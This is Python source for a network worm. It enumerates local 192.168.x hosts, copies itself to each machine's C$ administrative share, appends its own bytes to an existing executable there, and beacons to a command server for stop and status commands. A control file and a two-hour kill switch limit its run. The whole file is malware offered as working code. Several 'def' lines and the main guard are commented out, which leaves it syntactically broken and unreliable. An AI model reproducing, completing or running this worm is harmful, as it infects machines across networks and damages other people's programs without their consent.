import os
import shutil
import socket
import subprocess
import sys
import time
from typing import List

# Configuration
WORM_NAME = 'worm.exe'
TARGET_FILE = 'target.exe'
CONTROL_FILE = 'control.txt'
TARGET_FOLDER = r'C$\Users\Public\Documents'
UPDATE_INTERVAL = 10  # Time in seconds to check for control updates
KILL_SWITCH_DURATION = 2 * 60 * 60  # 2 hours in seconds
LOCAL_NETWORK_PREFIX = '192.168.'  # Local network range prefix
COMMAND_SERVER_IP = '127.0.0.1'  # Replace with actual server IP if not local
COMMAND_SERVER_PORT = 9999
MAX_BEACON_FAILURES = 3  # Number of consecutive beacon failures before self-destruction

#def get_local_ip() -> str:
    """Get the local IP address."""
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    except socket.error as e:
        print(f"Error getting local IP: {e}")
        return ''

#def find_local_network_ips() -> List[str]:
    """Find other IP addresses on the local network."""
    local_ip = get_local_ip()
    base_ip = '.'.join(local_ip.split('.')[:-1])
    return [f"{base_ip}.{i}" for i in range(1, 255) if i != int(local_ip.split('.')[-1]) and f"{base_ip}.{i}".startswith(LOCAL_NETWORK_PREFIX)]

#def embed_worm(target_path: str) -> None:
    """Embed the worm into another executable and log the activity."""
    try:
        with open(WORM_NAME, 'rb') as worm_file:
            worm_code = worm_file.read()

        with open(target_path, 'rb') as file:
            target_code = file.read()

        with open(target_path + '.infected', 'wb') as infected_file:
            infected_file.write(target_code)
            infected_file.write(b'\n' + worm_code)

        shutil.move(target_path + '.infected', target_path)
        log_activity(f"Embedded worm into {target_path}.")
    except Exception as e:
        log_activity(f"Error embedding worm: {e}")

#def copy_to_local_network(target_ips: List[str]) -> None:
    """Copy the infected executable to local network targets."""
    for ip in target_ips:
        target_path = f"\\\\{ip}{TARGET_FOLDER}\\{TARGET_FILE}"
        try:
            if os.path.isfile(WORM_NAME):
                shutil.copy(WORM_NAME, target_path)
                log_activity(f"Copied worm to {target_path}")
                # Trigger high network activity
                send_alert(ip)
        except Exception as e:
            log_activity(f"Failed to copy worm to {ip}: {e}")

def send_alert(ip: str) -> None:
    """Send an alert to the specified IP to generate network traffic."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as alert_socket:
            alert_socket.connect((ip, 80))  # Use a common port
            alert_socket.sendall(b'ALERT: Worm activity detected!')
            alert_socket.close()
            log_activity(f"Alert sent to {ip}")
    except Exception as e:
        log_activity(f"Failed to send alert to {ip}: {e}")

def check_command_server() -> str:
    """Check the command server for any new commands."""
    consecutive_failures = 0
    while consecutive_failures < MAX_BEACON_FAILURES:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.settimeout(5)  # Timeout for connection attempt
                client_socket.connect((COMMAND_SERVER_IP, COMMAND_SERVER_PORT))
                client_socket.sendall(b'CHECK')
                response = client_socket.recv(1024).decode()
                return response
        except socket.error as e:
            log_activity(f"Error contacting command server: {e}")
            consecutive_failures += 1
            if consecutive_failures >= MAX_BEACON_FAILURES:
                log_activity("Max beacon failures reached. Exiting.")
                sys.exit(0)
            time.sleep(UPDATE_INTERVAL)
    return ''

def log_activity(message: str) -> None:
    """Log activities to a local file."""
    with open('worm_log.txt', 'a') as log_file:
        log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

def check_control_file() -> bool:
    """Check for a control file to decide if the worm should stop spreading."""
    return not os.path.isfile(CONTROL_FILE)

def main():
    """Main function to run the worm with control and kill switch."""
    start_time = time.time()
    
    try:
        while True:
            # Check command server for remote control
            command = check_command_server()
            if command == 'STOP':
                log_activity("STOP command received. Exiting.")
                sys.exit(0)
            elif command == 'STATUS':
                log_activity("STATUS command received.")
                print("Worm status: Running")
            
            # Check local control file
            if check_control_file():
                local_ips = find_local_network_ips()
                copy_to_local_network(local_ips)
                for ip in local_ips:
                    target_path = f"\\\\{ip}{TARGET_FOLDER}\\{TARGET_FILE}"
                    if os.path.isfile(target_path):
                        embed_worm(target_path)
            else:
                log_activity("Control file detected. Stopping worm.")
                sys.exit(0)
            
            # Check kill switch
            elapsed_time = time.time() - start_time
            if elapsed_time >= KILL_SWITCH_DURATION:
                log_activity("Kill switch activated. Exiting.")
                sys.exit(0)
            
            time.sleep(UPDATE_INTERVAL)
    except Exception as e:
        log_activity(f"An error occurred: {e}")

#if __name__ == "__main__":
 #   main()
